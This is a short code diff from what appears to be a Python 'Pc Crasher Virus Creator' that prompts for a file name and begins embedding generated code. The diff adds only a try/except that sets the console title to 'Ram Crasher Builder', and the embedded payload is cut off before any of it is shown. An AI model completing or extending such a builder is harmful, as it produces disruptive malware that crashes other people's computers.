@@ -1,3 +1,9 @@
+try:
+    import os
+    from os import system
+    system("title " + "Ram Crasher Builder")
+except:
+    pass
 print("Pc Crasher Virus Creator")
 name = input("Enter What You Want The Name Of The File Should Be: ")
 code = """
